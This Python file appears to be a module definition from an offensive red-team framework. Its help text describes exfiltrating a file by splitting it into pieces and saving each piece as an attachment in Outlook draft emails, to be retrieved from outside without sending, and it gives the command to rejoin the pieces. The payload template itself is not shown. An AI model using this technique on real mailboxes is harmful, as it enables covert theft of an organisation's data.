from lib.core.specmodule import SpecModule
from lib.modhandlers.generic import quotedstring,makeint
from lib.validators.generic import isint

class Spec(SpecModule):
    def __init__(self, templatepath, helpers):
        self.options = {}
        self.helpers = helpers
        self.help = """
        This module allows you exfiltrate files by saving emails with attachments in the drafts folder in Outlook.
        The idea is that you have access to the mailbox externally and can place the drafts emails with attachments and retrieve it that way without sending.

        It will split the file into smaller pieces and store the draft as a separate email.
        
        You specify the file you want to exfiltrate using the sourcefile option. 
        You specify the size per file you want in the splitsize option.

        Join the files back togheter with the command: copy /b c:\\temp\\filesbasename* exfile.zip

        It uses Wscript.Shell
        - ExpandEnvironmentStrings

        It uses Scripting.FileSystemObject
        - GetTempName
        - FileExists
        - DeleteFile
        - CreateTextFile
        - GetFile

        It uses OutlookApplication
        - CreateItem(0)
        """
        self.entry = 'savedraft_filemail'
        self.depends = []
        self.options['sourcefile'] = {
            "value": None,
            "required": True,
            "description": "Target path of file to split and exfiltrate",
            "handler": quotedstring
        }
        self.options['splitsize'] = {
            "value": "8",
            "required": True,
            "description": "Size in MB you want file to split into - default is 8MB",
            "handler": quotedstring,
            "validator": isint
        }
        super().__init__(templatepath)
